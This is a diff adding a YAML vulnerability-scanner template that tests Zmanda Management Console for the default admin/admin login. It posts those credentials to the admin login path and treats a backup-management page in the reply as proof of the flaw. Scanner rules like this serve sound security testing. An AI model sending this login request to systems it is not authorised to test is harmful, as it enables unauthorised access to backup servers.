@@ -1,0 +1,23 @@
+id:
+name: Zmanda-Default-Login
+transport: http
+tags:
+  - Zmanda
+rules:
+  req:
+    request:
+      cache: true
+      method: POST
+      path: /ZMC_Admin_Login
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: zmc_cookies_enabled=true
+      body: login=AEE&last_page=&username=admin&password=admin&submit=Login&JS_SWITCH=JS_ON
+      follow_redirects: true
+    expression: response.status==200 && response.body.bcontains(b'ZMC - Backup Set Management')
+
+expression: req()
+detail:
+  vulnerability:
+    proof:
+      info: "存在Zmanda-Default-Login 默认口令漏洞"
